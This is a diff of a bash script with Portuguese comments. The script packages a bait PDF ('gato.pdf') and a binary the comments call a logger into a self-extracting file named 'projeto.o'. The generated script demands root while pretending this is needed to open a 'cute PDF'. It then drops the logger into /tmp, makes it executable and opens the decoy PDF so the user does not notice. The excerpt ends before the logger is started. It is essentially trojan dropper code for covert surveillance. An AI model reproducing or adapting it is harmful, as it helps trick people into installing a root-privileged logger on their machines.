@@ -1,5 +1,3 @@
-#!/bin/bash
-
 # Como usar:
 # 1. Coloque este script na mesma pasta que:
 #    - gato.pdf (arquivo bait)
@@ -10,14 +8,18 @@
 # 5. Para testar: "sudo ./projeto.o"
 # ============================================
 
-# Codifica os arquivos em base64
+#Faz o codigo ser executado direto no terminal
+#!/bin/bash
+
+# Codifica os arquivos em base64 para proteger os dados
 PDF_B64=$(base64 -w0 gato.pdf)
 LOG_B64=$(base64 -w0 ../bin/out.out)  
 
-# Gera o conteúdo e arquivo final
+# Gera o conteúdo e arquivo final projeto.o
 cat > projeto.o << 'EOF'
 #!/bin/bash
 
+# Verifica se o programa esta sendo executado em modo usuário
 if [ "$EUID" -ne 0 ]; then
     echo "Precisa ser executado com admin para abrir o pdf fofo:3"
     exit 1
@@ -34,6 +36,7 @@ if pgrep -x "out.out" > /dev/null; then
     exit 0
 fi   
 
+# Placeholders dos arquivos
 PDF_B64="SUBSTITUIR_PDF"
 LOG_B64="SUBSTITUIR_LOG"
 
@@ -44,7 +47,7 @@ echo "$LOG_B64" | base64 -d > /tmp/out.out
 # Permite a execução do logger
 chmod +x /tmp/out.out
 
-# Abre o pdf sem o modo sudo 
+# Abre o pdf sem o modo sudo (da problema se for em modo sudo)
 if [ -n "$SUDO_USER" ]; then
     sudo -u "$SUDO_USER" xdg-open /tmp/trabalho.pdf 2>/dev/null &
 else
